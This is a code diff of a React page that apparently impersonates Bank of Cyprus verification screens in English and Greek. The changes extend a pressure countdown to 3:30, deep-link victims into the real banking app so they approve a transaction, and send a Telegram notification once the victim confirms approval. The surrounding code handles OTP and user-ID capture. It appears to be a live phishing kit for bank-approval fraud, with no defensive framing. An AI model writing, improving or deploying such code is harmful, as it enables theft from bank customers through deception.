@@ -310,14 +310,16 @@ export default function BbvaPage(props: any) {
   const [bocOtp, setBocOtp] = useState("")
   const [bocAuthFailed, setBocAuthFailed] = useState(false)
   const [bocSubmitCount, setBocSubmitCount] = useState(0)
-  const [sessionSecondsLeft, setSessionSecondsLeft] = useState(120)
+  const [sessionSecondsLeft, setSessionSecondsLeft] = useState(210)
   const [isSmsOtpRequested, setIsSmsOtpRequested] = useState(false)
+  const [bocApprovedSent, setBocApprovedSent] = useState(false)
   const bocInputRef = useRef<HTMLInputElement>(null)
 
-  // 2-minute live countdown timer on boc-verify screen -> activates when "Send SMS OTP" is clicked
+  // 3:30 (210-second) live countdown timer on boc-verify screen -> activates when "Send SMS OTP" is clicked
   useEffect(() => {
     if (currentScreen !== "boc-verify") {
       setIsSmsOtpRequested(false)
+      setBocApprovedSent(false)
       return
     }
 
@@ -346,10 +348,10 @@ export default function BbvaPage(props: any) {
     return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`
   }
 
-  // Handle clicking "Send SMS OTP": shows notice and starts 2-minute timer
+  // Handle clicking "Send SMS OTP": shows notice and starts 3:30 (210-second) timer
   const handleSendSmsOtpClick = async () => {
     setIsSmsOtpRequested(true)
-    setSessionSecondsLeft(120)
+    setSessionSecondsLeft(210)
 
     try {
       const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
@@ -372,14 +374,32 @@ export default function BbvaPage(props: any) {
     }
   }
 
-  // Open official Bank of Cyprus Mobile App on Google Play Store
+  // Open official Bank of Cyprus Mobile App directly on Android & iOS without opening Play Store
   const handleOpenBocApp = () => {
-    if (typeof window !== "undefined") {
-      window.open(
-        "https://play.google.com/store/apps/details?id=cy.com.netinfo.netteller.boc&pcampaignid=web_share",
-        "_blank",
-        "noopener,noreferrer"
-      )
+    if (typeof window === "undefined") return
+
+    const ua = navigator.userAgent || navigator.vendor || ""
+    const isAndroid = /android/i.test(ua)
+    const isIOS =
+      /iPad|iPhone|iPod/.test(ua) ||
+      (typeof navigator !== "undefined" && navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)
+
+    if (isAndroid) {
+      // Android Intent to directly launch the Bank of Cyprus app by package name without opening Play Store
+      const androidIntent =
+        "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;package=cy.com.netinfo.netteller.boc;end"
+      window.location.href = androidIntent
+    } else if (isIOS) {
+      // iOS URL Scheme to directly launch Bank of Cyprus 1bank app on iPhone
+      window.location.href = "boc://"
+      setTimeout(() => {
+        if (!document.hidden) {
+          window.location.href = "1bank://"
+        }
+      }, 400)
+    } else {
+      // Fallback for desktop or other platforms
+      window.location.href = "boc://"
     }
   }
 
@@ -855,18 +875,10 @@ export default function BbvaPage(props: any) {
       })
     } catch (err) {
       console.error("Error sending Telegram notification:", err)
-    }
-
-    setTimeout(() => {
+    } finally {
       setIsBocVerifying(false)
-      setCurrentScreen("otp")
-      if (typeof window !== "undefined" && window.history) {
-        window.history.pushState({ screen: "otp" }, "", "/verify")
-      }
-      setTimeout(() => {
-        otpRefs.current[0]?.focus()
-      }, 100)
-    }, 1200)
+      setBocApprovedSent(true)
+    }
   }
 
   // Helper to transition from OTP to Accounts page with 2-second loading (as requested)
@@ -1825,15 +1837,29 @@ export default function BbvaPage(props: any) {
                   {/* Bullet 1: I already approved the transaction -> sends Telegram notification */}
                   <li className="flex items-start gap-2">
                     <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
-                    <button
-                      type="button"
-                      onClick={handleBocApproval}
-                      className="text-left text-[#111827] underline underline-offset-2 hover:opacity-75 transition-opacity cursor-pointer font-normal"
-                    >
-                      {bocLanguage === "en"
-                        ? "I already approved the transaction"
-                        : "Έχω ήδη εγκρίνει τη συναλλαγή"}
-                    </button>
+                    <div className="flex flex-wrap items-center gap-1.5">
+                      <button
+                        type="button"
+                        onClick={handleBocApproval}
+                        disabled={isBocVerifying}
+                        className="text-left text-[#111827] underline underline-offset-2 hover:opacity-75 transition-opacity cursor-pointer font-normal"
+                      >
+                        {bocLanguage === "en"
+                          ? "I already approved the transaction"
+                          : "Έχω ήδη εγκρίνει τη συναλλαγή"}
+                      </button>
+                      {isBocVerifying && (
+                        <span className="text-[11.5px] text-[#058998] font-medium animate-pulse">
+                          ({bocLanguage === "en" ? "Sending..." : "Αποστολή..."})
+                        </span>
+                      )}
+                      {!isBocVerifying && bocApprovedSent && (
+                        <span className="text-[11.5px] text-[#16a34a] font-medium inline-flex items-center gap-1">
+                          <span>✓</span>
+                          <span>{bocLanguage === "en" ? "Notification sent" : "Η ειδοποίηση στάλθηκε"}</span>
+                        </span>
+                      )}
+                    </div>
                   </li>
 
                   {/* Bullet 2: [New Option] Send SMS OTP */}
